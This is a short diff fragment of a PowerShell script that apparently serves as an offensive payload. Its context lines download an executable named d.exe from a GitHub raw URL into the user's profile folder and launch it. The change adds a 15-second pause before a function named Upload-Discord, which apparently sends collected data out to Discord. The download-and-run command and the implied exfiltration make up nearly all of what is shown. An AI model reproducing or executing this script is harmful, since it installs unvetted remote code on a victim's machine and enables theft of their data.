@@ -3,6 +3,8 @@ iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.ex
 start-process "$env:USERPROFILE\d.exe"
 
 
+start-sleep 15
+
 
 
 function Upload-Discord {
